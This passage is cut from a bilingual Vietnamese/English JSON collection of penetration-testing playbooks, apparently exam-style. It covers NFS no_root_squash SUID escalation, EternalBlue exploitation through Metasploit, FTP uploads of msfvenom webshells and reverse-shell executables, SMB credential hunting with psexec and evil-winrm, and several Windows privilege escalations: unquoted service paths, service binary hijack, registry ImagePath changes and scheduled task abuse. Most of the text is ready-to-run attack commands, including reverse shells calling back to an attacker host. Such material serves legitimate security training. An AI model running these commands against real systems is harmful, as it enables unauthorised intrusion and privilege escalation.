**Th·ª±c thi tr√™n Target:** T·ª´ shell user tr√™n target, ch·∫°y binary SUID: `/<share_path>/rootshell -p`.\n6.  **X√°c nh·∫≠n Root:** `id`.",
    "steps": [
      { "vi": "**X√°c nh·∫≠n `no_root_squash`:**", "en": "**Confirm `no_root_squash`:**", "command": "showmount -e <target_ip>" },
      { "vi": "**T·∫°o th∆∞ m·ª•c Mount (Kali):**", "en": "**Create Mount Directory (Kali):**", "command": "sudo mkdir /mnt/nfs_share" },
      { "vi": "**Mount Share (Kali):**", "en": "**Mount Share (Kali):**", "command": "sudo mount -t nfs <target_ip>:/<share_path> /mnt/nfs_share -o nolock" },
      { "vi": "**T·∫°o SUID Binary - C√°ch 1 (Copy bash, Kali):**", "en": "**Create SUID Binary - Method 1 (Copy bash, Kali):**", "command": "sudo cp /bin/bash /mnt/nfs_share/rootshell; sudo chmod +s /mnt/nfs_share/rootshell" },
      { "vi": "**T·∫°o SUID Binary - C√°ch 2 (Compile C, Kali):**", "en": "**Create SUID Binary - Method 2 (Compile C, Kali):**", "notes": { "vi": "T·∫°o `suid.c` v·ªõi n·ªôi dung `setuid(0); setgid(0); system(\"/bin/bash -p\");`", "en": "Create `suid.c` with content `setuid(0); setgid(0); system(\"/bin/bash -p\");`" } },
      { "vi": "(Ti·∫øp) Compile C:", "en": "(Cont.) Compile C:", "command": "gcc suid.c -o /mnt/nfs_share/rootshell; sudo chown root:root /mnt/nfs_share/rootshell; sudo chmod +s /mnt/nfs_share/rootshell" },
      { "vi": "**Unmount Share (Kali, T√πy ch·ªçn):**", "en": "**Unmount Share (Kali, Optional):**", "command": "sudo umount /mnt/nfs_share" },
      { "vi": "**Th·ª±c thi tr√™n Target:**", "en": "**Execute on Target:**", "command": "/<share_path>/rootshell -p" },
      { "vi": "**X√°c nh·∫≠n Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["port_2049", "linuxprivesc_nfs_no_root_squash", "showmount", "mount", "cp", "chmod"]
  },
  "playbook_10_windows_foothold_ms17_010": {
    "title": {
      "vi": "Playbook 10: Windows Foothold qua MS17-010 (EternalBlue)",
      "en": "Playbook 10: Windows Foothold via MS17-010 (EternalBlue)"
    },
    "assumption": "Nmap (`--script smb-vuln-ms17-010`) x√°c nh·∫≠n Port 445 (SMB) tr√™n m√°y Windows m·ª•c ti√™u (th∆∞·ªùng Win7/2008) d·ªÖ b·ªã t·∫•n c√¥ng b·ªüi MS17-010.",
    "objective": "Gi√†nh quy·ªÅn truy c·∫≠p SYSTEM shell b·∫±ng c√°ch khai th√°c MS17-010.",
    "tools": ["nmap", "metasploit"],
    "phases": ["Initial Foothold", "Exploitation"],
    "techniques": ["SMB Exploit", "MS17-010", "EternalBlue", "RCE"],
    "targets": ["Windows SMB (Vulnerable)"],
    "os": ["Windows"],
    "tags": ["windows", "foothold", "smb", "ms17-010", "eternalblue", "rce", "system", "nmap", "metasploit"],
    "content": "## Playbook 10: Windows Foothold qua MS17-010 (EternalBlue) üö™üí•üëë\n\n**Gi·∫£ ƒë·ªãnh:** Nmap x√°c nh·∫≠n SMB d·ªÖ b·ªã t·∫•n c√¥ng b·ªüi MS17-010.\n\n**M·ª•c ti√™u:** Gi√†nh SYSTEM shell qua MS17-010.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n L·ªó h·ªïng:** `nmap -p 445 --script smb-vuln-ms17-010 <target_ip>`.\n2.  **S·ª≠ d·ª•ng Metasploit:**\n    ```bash\n    msfconsole\n    use exploit/windows/smb/ms17_010_eternalblue \n    set RHOSTS <target_ip>\n    # set PAYLOAD windows/x64/meterpreter/reverse_tcp (ho·∫∑c payload ph√π h·ª£p)\n    set LHOST <kali_ip>\n    run \n    ```\n   \n3.  **X√°c nh·∫≠n Shell:** N·∫øu th√†nh c√¥ng, b·∫°n s·∫Ω c√≥ Meterpreter ho·∫∑c shell v·ªõi quy·ªÅn `NT AUTHORITY\\SYSTEM`.",
    "steps": [
      { "vi": "**X√°c nh·∫≠n L·ªó h·ªïng:**", "en": "**Confirm Vulnerability:**", "command": "nmap -p 445 --script smb-vuln-ms17-010 <target_ip>" },
      { "vi": "**S·ª≠ d·ª•ng Metasploit:**", "en": "**Use Metasploit:**", "command": "msfconsole" },
      { "vi": "(MSF) Ch·ªçn Exploit:", "en": "(MSF) Select Exploit:", "command": "use exploit/windows/smb/ms17_010_eternalblue" },
      { "vi": "(MSF) ƒê·∫∑t Target:", "en": "(MSF) Set Target:", "command": "set RHOSTS <target_ip>" },
      { "vi": "(MSF) ƒê·∫∑t Listener:", "en": "(MSF) Set Listener:", "command": "set LHOST <kali_ip>" },
      { "vi": "(MSF) Ch·∫°y:", "en": "(MSF) Run:", "command": "run" },
      { "vi": "**X√°c nh·∫≠n Shell:** Quy·ªÅn `NT AUTHORITY\\SYSTEM`.", "en": "**Confirm Shell:** `NT AUTHORITY\\SYSTEM` privileges." }
    ],
    "related_knowledge_ids": ["port_445", "nmap", "metasploit"]
  },
  "playbook_11_windows_foothold_ftp_anon": {
    "title": {
      "vi": "Playbook 11: Windows Foothold qua FTP Anonymous Login + Upload",
      "en": "Playbook 11: Windows Foothold via FTP Anonymous Login + Upload"
    },
    "assumption": "Nmap t√¨m th·∫•y Port 21 (FTP) m·ªü, cho ph√©p ƒëƒÉng nh·∫≠p `anonymous` v√† c√≥ quy·ªÅn ghi (upload). C√≥ th·ªÉ c√≥ web server ƒëang ch·∫°y.",
    "objective": "Gi√†nh reverse shell b·∫±ng c√°ch t·∫£i l√™n webshell ho·∫∑c executable qua FTP.",
    "tools": ["nmap", "ftp", "msfvenom", "nc"],
    "phases": ["Initial Foothold", "Exploitation"],
    "techniques": ["FTP Anonymous Login", "File Upload", "Webshell", "Reverse Shell"],
    "targets": ["FTP Server", "Web Server"],
    "os": ["Windows"],
    "tags": ["windows", "foothold", "ftp", "anonymous ftp", "file upload", "webshell", "reverse shell", "msfvenom"],
    "content": "## Playbook 11: Windows Foothold qua FTP Anonymous Login + Upload üö™üìÑ‚û°Ô∏èüêö\n\n**Gi·∫£ ƒë·ªãnh:** FTP (Port 21) cho ph√©p login `anonymous` v√† upload. C√≥ web server.\n\n**M·ª•c ti√™u:** Gi√†nh reverse shell qua FTP upload.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **K·∫øt n·ªëi FTP:** `ftp <target_ip>`, User: `anonymous`, Pass: `anonymous`.\n2.  **Ki·ªÉm tra Quy·ªÅn ghi v√† Web Root:** Th·ª≠ `put test.txt`. T√¨m th∆∞ m·ª•c g·ªëc web (v√≠ d·ª•: `C:\\inetpub\\wwwroot`, `C:\\xampp\\htdocs`).\n3.  **T·∫°o v√† T·∫£i l√™n Payload:**\n    * **Webshell (ASPX):** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=443 -f aspx -o shell.aspx`. FTP: `put shell.aspx`.\n    * **Executable (EXE):** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o rev.exe`. FTP: `put rev.exe`.\n4.  **M·ªü Listener:** `rlwrap nc -lvnp 4444` (cho EXE) ho·∫∑c `msfconsole multi/handler` (cho Meterpreter).\n5.  **K√≠ch ho·∫°t Payload:**\n    * **Webshell:** Truy c·∫≠p `http://<target_ip>/shell.aspx` t·ª´ tr√¨nh duy·ªát.\n    * **Executable:** N·∫øu c√≥ c√°ch th·ª±c thi file (v√≠ d·ª•: qua l·ªó h·ªïng kh√°c, scheduled task), ch·∫°y `rev.exe`.",
    "steps": [
      { "vi": "**K·∫øt n·ªëi FTP:** User: `anonymous`, Pass: `anonymous`.", "en": "**Connect FTP:** User: `anonymous`, Pass: `anonymous`.", "command": "ftp <target_ip>" },
      { "vi": "**Ki·ªÉm tra Quy·ªÅn ghi & Web Root:** Th·ª≠ `put test.txt`.", "en": "**Check Write Permissions & Web Root:** Try `put test.txt`." },
      { "vi": "**T·∫°o Webshell (ASPX):**", "en": "**Create Webshell (ASPX):**", "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=443 -f aspx -o shell.aspx" },
      { "vi": "**T·∫£i l√™n Webshell (FTP):**", "en": "**Upload Webshell (FTP):**", "command": "put shell.aspx" },
      { "vi": "**T·∫°o Executable (EXE):**", "en": "**Create Executable (EXE):**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o rev.exe" },
      { "vi": "**T·∫£i l√™n Executable (FTP):**", "en": "**Upload Executable (FTP):**", "command": "put rev.exe" },
      { "vi": "**M·ªü Listener (EXE):**", "en": "**Start Listener (EXE):**", "command": "rlwrap nc -lvnp 4444" },
      { "vi": "**M·ªü Listener (Meterpreter):**", "en": "**Start Listener (Meterpreter):**", "command": "msfconsole -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <kali_ip>; set LPORT 443; run'" },
      { "vi": "**K√≠ch ho·∫°t Webshell:** Truy c·∫≠p URL.", "en": "**Trigger Webshell:** Access URL.", "command": "http://<target_ip>/shell.aspx" },
      { "vi": "**K√≠ch ho·∫°t Executable:** Ch·∫°y `rev.exe`.", "en": "**Trigger Executable:** Run `rev.exe`." }
    ],
    "related_knowledge_ids": ["port_21", "ftp", "msfvenom", "nc", "rce_kali_setup", "metasploit_msfvenom_handler"]
  },
  "playbook_12_windows_foothold_smb_share": {
    "title": {
      "vi": "Playbook 12: Windows Foothold qua SMB Share Credentials",
      "en": "Playbook 12: Windows Foothold via SMB Share Credentials"
    },
    "assumption": "Enumeration SMB (Null session ho·∫∑c creds y·∫øu) cho ph√©p truy c·∫≠p m·ªôt share ch·ª©a t·ªáp c·∫•u h√¨nh ho·∫∑c script c√≥ ch·ª©a credentials h·ª£p l·ªá.",
    "objective": "T√¨m credentials trong SMB share v√† s·ª≠ d·ª•ng ch√∫ng ƒë·ªÉ gi√†nh quy·ªÅn truy c·∫≠p.",
    "tools": ["smbclient", "crackmapexec", "grep", "impacket-psexec", "evil-winrm"],
    "phases": ["Enumeration", "Initial Foothold"],
    "techniques": ["SMB Enumeration", "Credential Hunting", "Lateral Movement"],
    "targets": ["SMB Share", "Windows Credentials"],
    "os": ["Windows"],
    "tags": ["windows", "foothold", "smb", "smbclient", "crackmapexec", "credential hunting", "psexec", "evil-winrm"],
    "content": "## Playbook 12: Windows Foothold qua SMB Share Credentials üö™üìÇ‚û°Ô∏èüîë\n\n**Gi·∫£ ƒë·ªãnh:** Truy c·∫≠p ƒë∆∞·ª£c SMB share ch·ª©a credentials.\n\n**M·ª•c ti√™u:** T√¨m credentials v√† d√πng ch√∫ng ƒë·ªÉ c√≥ shell.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Truy c·∫≠p Share:** `smbclient //<target_ip>/<share_name> -N` (Null) ho·∫∑c `-U '<user>%<pass>'`.\n2.  **T√¨m ki·∫øm Credentials:**\n    * T·∫£i v·ªÅ c√°c t·ªáp ƒë√°ng ng·ªù: `mget *`.\n    * Ph√¢n t√≠ch t·ªáp tr√™n Kali: `grep -riE 'password|pass|secret' <downloaded_files>`. T√¨m trong file config, script, backup.\n3.  **X√°c th·ª±c Credentials:** D√πng `crackmapexec` ƒë·ªÉ ki·ªÉm tra creds t√¨m ƒë∆∞·ª£c.\n    ```bash\n    crackmapexec smb <target_ip> -u <found_user> -p '<found_pass>' \n    ```\n   \n4.  **Gi√†nh Shell:** N·∫øu creds h·ª£p l·ªá v√† c√≥ quy·ªÅn:\n    * `impacket-psexec <domain>/<found_user>:<found_pass>@<target_ip>`\n    * `evil-winrm -i <target_ip> -u <found_user> -p '<found_pass>'`",
    "steps": [
      { "vi": "**Truy c·∫≠p Share (Null):**", "en": "**Access Share (Null):**", "command": "smbclient //<target_ip>/<share_name> -N" },
      { "vi": "**Truy c·∫≠p Share (Creds):**", "en": "**Access Share (Creds):**", "command": "smbclient //<target_ip>/<share_name> -U '<user>%<pass>'" },
      { "vi": "**T·∫£i File (smbclient):**", "en": "**Download Files (smbclient):**", "command": "mget *" },
      { "vi": "**T√¨m Creds (Kali):**", "en": "**Search Creds (Kali):**", "command": "grep -riE 'password|pass|secret' <downloaded_files>" },
      { "vi": "**X√°c th·ª±c Creds:**", "en": "**Validate Creds:**", "command": "crackmapexec smb <target_ip> -u <found_user> -p '<found_pass>'" },
      { "vi": "**Gi√†nh Shell (PsExec):**", "en": "**Get Shell (PsExec):**", "command": "impacket-psexec <domain>/<found_user>:<found_pass>@<target_ip>" },
      { "vi": "**Gi√†nh Shell (Evil-WinRM):**", "en": "**Get Shell (Evil-WinRM):**", "command": "evil-winrm -i <target_ip> -u <found_user> -p '<found_pass>'" }
    ],
    "related_knowledge_ids": ["port_445", "smbclient", "impacket_smbclient", "smb_enumeration_tools", "crackmapexec", "ad_lateral_movement_crackmapexec", "psexec", "ad_lateral_movement_impacket", "evil_winrm_connection"]
  },
  "playbook_13_windows_privesc_unquoted_path": {
    "title": {
      "vi": "Playbook 13: Windows PrivEsc qua Unquoted Service Path",
      "en": "Playbook 13: Windows PrivEsc via Unquoted Service Path"
    },
    "assumption": "C√≥ shell user Windows. `wmic service get ...` ho·∫∑c `PowerUp` (`Get-UnquotedServicePath`) ph√°t hi·ªán m·ªôt service ch·∫°y v·ªõi quy·ªÅn cao c√≥ ƒë∆∞·ªùng d·∫´n kh√¥ng ƒë∆∞·ª£c ƒë·∫∑t trong d·∫•u ngo·∫∑c k√©p v√† ch·ª©a d·∫•u c√°ch. C√≥ quy·ªÅn ghi v√†o m·ªôt th∆∞ m·ª•c cha trong ƒë∆∞·ªùng d·∫´n ƒë√≥.",
    "objective": "Leo thang l√™n SYSTEM b·∫±ng c√°ch l·∫°m d·ª•ng unquoted service path.",
    "tools": ["wmic", "icacls", "msfvenom", "net", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Unquoted Service Path", "Insecure File Permissions"],
    "targets": ["Windows Services"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "unquoted service path", "wmic", "icacls", "msfvenom", "net start", "net stop"],
    "content": "## Playbook 13: Windows PrivEsc qua Unquoted Service Path üíª‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán unquoted service path v·ªõi quy·ªÅn ghi. V√≠ d·ª•: `C:\\Program Files\\Vuln Service\\service.exe`, c√≥ quy·ªÅn ghi v√†o `C:\\Program Files\\`.\n\n**M·ª•c ti√™u:** Leo thang l√™n SYSTEM.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c ƒë·ªãnh Service v√† Path:** D√πng `wmic service get name,pathname ...`.\n2.  **Ki·ªÉm tra Quy·ªÅn ghi:** `icacls \"C:\\Program Files\\\"`.\n3.  **T·∫°o Payload:** ƒê·∫∑t t√™n payload theo ph·∫ßn ƒë·∫ßu c·ªßa path c√≥ d·∫•u c√°ch. V√≠ d·ª• `Program.exe`.\n    ```bash\n    # Tr√™n Kali\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o Program.exe \n    ```\n   \n4.  **T·∫£i Payload l√™n:** Chuy·ªÉn `Program.exe` v√†o th∆∞ m·ª•c c√≥ quy·ªÅn ghi (`C:\\Program Files\\`).\n5.  **M·ªü Listener:** Tr√™n Kali, `rlwrap nc -lvnp 4446`.\n6.  **Kh·ªüi ƒë·ªông l·∫°i Service:**\n    ```powershell\n    net stop \"Vuln Service\" \n    net start \"Vuln Service\" \n    ```\n    (L·ªánh t∆∞∆°ng t·ª±)\n7.  **X√°c nh·∫≠n Shell SYSTEM.**",
    "steps": [
      { "vi": "**X√°c ƒë·ªãnh Service v√† Path:**", "en": "**Identify Service and Path:**", "command": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v \"\\\"\"" }, // L·ªánh wmic ƒë·∫ßy ƒë·ªß h∆°n
      { "vi": "**Ki·ªÉm tra Quy·ªÅn ghi:** (V√≠ d·ª• cho C:\\Program Files\\)", "en": "**Check Write Permissions:** (Example for C:\\Program Files\\)", "command": "icacls \"C:\\Program Files\\\"" },
      { "vi": "**T·∫°o Payload (Kali):** T√™n = ph·∫ßn ƒë·∫ßu path (v√≠ d·ª•: Program.exe)", "en": "**Create Payload (Kali):** Name = first part of path (e.g., Program.exe)", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o Program.exe" },
      { "vi": "**T·∫£i Payload l√™n:** V√†o th∆∞ m·ª•c c√≥ quy·ªÅn ghi.", "en": "**Upload Payload:** To the writable directory." },
      { "vi": "**M·ªü Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Kh·ªüi ƒë·ªông l·∫°i Service:**", "en": "**Restart Service:**", "command": "net stop \"Vuln Service\"; net start \"Vuln Service\"" }, // G·ªôp l·ªánh
      { "vi": "**X√°c nh·∫≠n Shell SYSTEM.**", "en": "**Confirm SYSTEM Shell.**" }
    ],
    "related_knowledge_ids": ["winprivesc_unquoted_service_path_vector", "wmic", "icacls", "msfvenom", "rce_kali_setup", "net stop", "net start", "winprivesc_service_binary_hijack"]
  },
  "playbook_14_windows_privesc_service_binary_hijack": {
    "title": {
      "vi": "Playbook 14: Windows PrivEsc qua Insecure Service Permissions (Binary Hijack)",
      "en": "Playbook 14: Windows PrivEsc via Insecure Service Permissions (Binary Hijack)"
    },
    "assumption": "C√≥ shell user Windows. `icacls` ho·∫∑c `PowerUp` (`Get-ModifiableServiceFile`) x√°c nh·∫≠n file th·ª±c thi c·ªßa m·ªôt service ch·∫°y v·ªõi quy·ªÅn cao (SYSTEM) c√≥ th·ªÉ b·ªã ghi ƒë√® b·ªüi user hi·ªán t·∫°i.",
    "objective": "Leo thang l√™n SYSTEM b·∫±ng c√°ch thay th·∫ø service binary.",
    "tools": ["icacls", "Get-CimInstance", "msfvenom", "net", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Service Binary Hijacking", "Insecure File Permissions"],
    "targets": ["Windows Services"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "service hijack", "binary hijack", "insecure permissions", "icacls", "msfvenom", "net start", "net stop"],
    "content": "## Playbook 14: Windows PrivEsc qua Insecure Service Permissions (Binary Hijack) üíª‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán service binary c√≥ quy·ªÅn ghi. V√≠ d·ª•: `C:\\Services\\VulnSvc.exe`.\n\n**M·ª•c ti√™u:** Leo thang l√™n SYSTEM.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c ƒë·ªãnh Service v√† Quy·ªÅn ghi:** `Get-CimInstance win32_service | ?{$_.PathName -like 'C:\\Services\\*'}`. `icacls \"C:\\Services\\VulnSvc.exe\"`.\n2.  **T·∫°o Payload:**\n    ```bash\n    # Tr√™n Kali\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o rev.exe \n    ```\n   \n3.  **Sao l∆∞u v√† Thay th·∫ø Binary:**\n    ```powershell\n    # Sao l∆∞u (quan tr·ªçng!)\n    copy C:\\Services\\VulnSvc.exe C:\\Windows\\Temp\\VulnSvc.bak \n    # T·∫£i payload l√™n C:\\Windows\\Temp\\rev.exe\n    # Ghi ƒë√®\n    copy C:\\Windows\\Temp\\rev.exe C:\\Services\\VulnSvc.exe /Y \n    ```\n4.  **M·ªü Listener:** Tr√™n Kali, `rlwrap nc -lvnp 4446`.\n5.  **Kh·ªüi ƒë·ªông l·∫°i Service:**\n    ```powershell\n    net stop VulnSvc \n    net start VulnSvc \n    ```\n   \n6.  **X√°c nh·∫≠n Shell SYSTEM.**\n7.  **(Quan tr·ªçng) Kh√¥i ph·ª•c Binary G·ªëc:** Sau khi xong vi·ªác, d·ª´ng service v√† copy file `.bak` tr·ªü l·∫°i.",
    "steps": [
      { "vi": "**X√°c ƒë·ªãnh Service:**", "en": "**Identify Service:**", "command": "Get-CimInstance win32_service | ?{$_.PathName -like 'C:\\Services\\*'}" },
      { "vi": "**Ki·ªÉm tra Quy·ªÅn ghi:**", "en": "**Check Write Permissions:**", "command": "icacls \"C:\\Services\\VulnSvc.exe\"" },
      { "vi": "**T·∫°o Payload (Kali):**", "en": "**Create Payload (Kali):**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o rev.exe" },
      { "vi": "**Sao l∆∞u Binary G·ªëc:**", "en": "**Backup Original Binary:**", "command": "copy C:\\Services\\VulnSvc.exe C:\\Windows\\Temp\\VulnSvc.bak" },
      { "vi": "**T·∫£i Payload l√™n Target:** (v√≠ d·ª•: v√†o C:\\Windows\\Temp\\rev.exe)", "en": "**Upload Payload to Target:** (e.g., to C:\\Windows\\Temp\\rev.exe)" },
      { "vi": "**Thay th·∫ø Binary:**", "en": "**Replace Binary:**", "command": "copy C:\\Windows\\Temp\\rev.exe C:\\Services\\VulnSvc.exe /Y" },
      { "vi": "**M·ªü Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Kh·ªüi ƒë·ªông l·∫°i Service:**", "en": "**Restart Service:**", "command": "net stop VulnSvc; net start VulnSvc" },
      { "vi": "**X√°c nh·∫≠n Shell SYSTEM.**", "en": "**Confirm SYSTEM Shell.**" },
      { "vi": "**(Quan tr·ªçng) Kh√¥i ph·ª•c Binary G·ªëc:**", "en": "**(Important) Restore Original Binary:**", "command": "net stop VulnSvc; copy C:\\Windows\\Temp\\VulnSvc.bak C:\\Services\\VulnSvc.exe /Y; net start VulnSvc" }
    ],
    "related_knowledge_ids": ["winprivesc_insecure_service_permissions", "icacls", "Get-CimInstance", "msfvenom", "net stop", "net start", "rce_kali_setup", "winprivesc_service_binary_hijack"]
  },
  "playbook_15_windows_privesc_weak_registry": {
    "title": {
      "vi": "Playbook 15: Windows PrivEsc qua Weak Registry Permissions",
      "en": "Playbook 15: Windows PrivEsc via Weak Registry Permissions"
    },
    "assumption": "C√≥ shell user Windows. `accesschk.exe` ho·∫∑c `PowerUp` (`Get-ModifiableRegistryAutoRun`) ph√°t hi·ªán user c√≥ quy·ªÅn ghi (`KEY_ALL_ACCESS`) tr√™n registry key c·ªßa m·ªôt service ch·∫°y v·ªõi quy·ªÅn cao (`HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service>`).",
    "objective": "Leo thang l√™n SYSTEM b·∫±ng c√°ch s·ª≠a ƒë·ªïi ImagePath trong registry.",
    "tools": ["accesschk.exe", "reg", "msfvenom", "net", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Weak Registry Permissions", "Insecure Permissions"],
    "targets": ["Windows Registry", "Windows Services"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "registry permissions", "insecure permissions", "accesschk", "reg add", "msfvenom", "net start", "net stop"],
    "content": "## Playbook 15: Windows PrivEsc qua Weak Registry Permissions üíª‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán registry key c·ªßa service c√≥ quy·ªÅn ghi.\n\n**M·ª•c ti√™u:** Leo thang l√™n SYSTEM.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n Quy·ªÅn ghi Registry:**\n    ```powershell\n    # T·∫£i accesschk.exe l√™n\n    .\\accesschk.exe /accepteula -uvwqk HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc \n    ```\n   \n2.  **T·∫°o Payload:**\n    ```bash\n    # Tr√™n Kali\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o rev.exe \n    ```\n   \n3.  **T·∫£i Payload l√™n:** Chuy·ªÉn `rev.exe` v√†o `C:\\Windows\\Temp\\`.\n4.  **S·ª≠a ƒë·ªïi ImagePath:**\n    ```powershell\n    reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d C:\\Windows\\Temp\\rev.exe /f \n    ```\n   \n5.  **M·ªü Listener:** Tr√™n Kali, `rlwrap nc -lvnp 4446`.\n6.  **Kh·ªüi ƒë·ªông l·∫°i Service:**\n    ```powershell\n    net stop VulnSvc \n    net start VulnSvc \n    ```\n   \n7.  **X√°c nh·∫≠n Shell SYSTEM.**\n8.  **(Quan tr·ªçng) Kh√¥i ph·ª•c ImagePath G·ªëc:** Ghi l·∫°i gi√° tr·ªã c≈© tr∆∞·ªõc khi s·ª≠a v√† kh√¥i ph·ª•c sau ƒë√≥.",
    "steps": [
      { "vi": "**X√°c nh·∫≠n Quy·ªÅn ghi Registry:** (Y√™u c·∫ßu accesschk.exe)", "en": "**Confirm Registry Write Permissions:** (Requires accesschk.exe)", "command": ".\\accesschk.exe /accepteula -uvwqk HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc" },
       { "vi": "**(Ghi l·∫°i ImagePath g·ªëc):**", "en": "**(Record original ImagePath):**", "command": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc /v ImagePath" }, // Th√™m b∆∞·ªõc ghi l·∫°i
      { "vi": "**T·∫°o Payload (Kali):**", "en": "**Create Payload (Kali):**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o rev.exe" },
      { "vi": "**T·∫£i Payload l√™n Target:** (v√≠ d·ª•: C:\\Windows\\Temp\\)", "en": "**Upload Payload to Target:** (e.g., C:\\Windows\\Temp\\)" },
      { "vi": "**S·ª≠a ƒë·ªïi ImagePath:**", "en": "**Modify ImagePath:**", "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d C:\\Windows\\Temp\\rev.exe /f" },
      { "vi": "**M·ªü Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Kh·ªüi ƒë·ªông l·∫°i Service:**", "en": "**Restart Service:**", "command": "net stop VulnSvc; net start VulnSvc" },
      { "vi": "**X√°c nh·∫≠n Shell SYSTEM.**", "en": "**Confirm SYSTEM Shell.**" },
      { "vi": "**(Quan tr·ªçng) Kh√¥i ph·ª•c ImagePath G·ªëc:**", "en": "**(Important) Restore Original ImagePath:**", "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d <Original_Path> /f" } // Th√™m b∆∞·ªõc kh√¥i ph·ª•c
    ],
    "related_knowledge_ids": ["winprivesc_weak_registry_permissions", "accesschk.exe", "reg add", "reg query", "msfvenom", "net stop", "net start", "rce_kali_setup"]
  },
  "playbook_16_windows_privesc_scheduled_task_abuse": {
    "title": {
      "vi": "Playbook 16: Windows PrivEsc qua Scheduled Task Abuse",
      "en": "Playbook 16: Windows PrivEsc via Scheduled Task Abuse"
    },
    "assumption": "C√≥ shell user Windows. `schtasks` ho·∫∑c `PowerUp` (`Get-ModifiableScheduledTaskFile`) ph√°t hi·ªán m·ªôt scheduled task ch·∫°y v·ªõi quy·ªÅn cao (SYSTEM/Admin) c√≥ file th·ª±c thi n·∫±m trong th∆∞ m·ª•c m√† user hi·ªán t·∫°i c√≥ quy·ªÅn ghi.",
    "objective": "Leo thang quy·ªÅn b·∫±ng c√°ch thay th·∫ø file th·ª±c thi c·ªßa scheduled task.",
    "tools": ["schtasks", "icacls", "msfvenom", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Scheduled Task Abuse", "Insecure File Permissions"],
    "targets": ["Windows Scheduled Tasks"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "scheduled tasks", "schtasks", "insecure permissions", "msfvenom"],
    "content": "## Playbook 16: Windows PrivEsc qua Scheduled Task Abuse üíª‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán scheduled task v·ªõi file th·ª±c thi c√≥ th·ªÉ ghi ƒë√®. V√≠ d·ª•: Task `Cleanup` ch·∫°y `C:\\Tasks\\cleanup.exe`.\n\n**M·ª•c ti√™u:** Leo thang quy·ªÅn.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c ƒë·ªãnh Task v√† Quy·ªÅn ghi:** `schtasks /query /fo LIST /v | findstr /B /C:\"Task To Run\" /C:\"Run As User\"`. `icacls C:\\Tasks\\cleanup.exe`.\n2.  **T·∫°o Payload:**\n    ```bash\n    # Tr√™n Kali\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o cleanup.exe \n    ```\n   \n3.  **Sao l∆∞u v√† Thay th·∫ø Executable:**\n    ```powershell\n    copy C:\\Tasks\\cleanup.exe C:\\Windows\\Temp\\cleanup.bak\n    # T·∫£i payload l√™n C:\\Windows\\Temp\\cleanup.exe\n    copy C:\\Windows\\Temp\\cleanup.exe C:\\Tasks\\cleanup.exe /Y\n    ```\n4.  **M·ªü Listener:** Tr√™n Kali, `rlwrap nc -lvnp 4446`.\n5.  **Ch·ªù Task Ch·∫°y:** ƒê·ª£i ƒë·∫øn th·ªùi gian trigger c·ªßa task ho·∫∑c th·ª≠ k√≠ch ho·∫°t th·ªß c√¥ng n·∫øu c√≥ th·ªÉ (`schtasks /run /tn TaskName`).\n6.  **X√°c nh·∫≠n Shell ƒê·∫∑c quy·ªÅn.**\n7.  **Kh√¥i ph·ª•c Executable G·ªëc.**",
    "steps": [
